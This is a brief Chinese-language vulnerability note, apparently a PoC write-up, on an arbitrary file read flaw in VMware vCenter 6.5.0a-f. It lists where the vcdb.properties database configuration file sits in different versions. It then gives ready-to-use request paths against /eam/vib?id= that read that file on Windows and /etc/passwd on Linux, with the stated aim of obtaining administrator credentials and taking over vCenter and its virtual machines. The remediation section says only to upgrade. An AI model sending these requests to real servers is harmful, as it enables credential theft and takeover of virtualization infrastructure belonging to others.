### 一 漏洞描述
VMware vCenter 服务器是一种高级服务器管理软件，提供一个用于控制 VMware vSphere 环境的集中式平台，帮助用户获取集中式可见性、简单高效的规模化管理，从而在整个混合云中自动部署和交付虚拟基础

VMware vCenter 存在任意文件读取漏洞，可读取 vCenter 配置文件获得管理帐号密码进而控制 vCenter 平台及其管理的虚拟机集群。

影响范围: VMware vCenter 6.5.0a-f

### 二 漏洞利用
由于不同的系统版本，数据库配置文件（vcdb.properties）存放位置不同，根据官方文档，大体可以分为：
```
对于 vCenter Server 5.5 及更低版本：
Windows 2008 - C:\ProgramData\VMware\VMware VirtualCenter
其他 Windows 版本 - C:\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\
对于 vCenter Server 6.0、6.5、6.7：
C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx

poc: /eam/vib?id={{path}}\vcdb.properties
```


```
#windows
/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
#linux
/eam/vib?id=/etc/passwd
```

### 三 漏洞修复
升级

> 参考链接
> https://www.cnblogs.com/yuzly/p/13832084.html
> https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
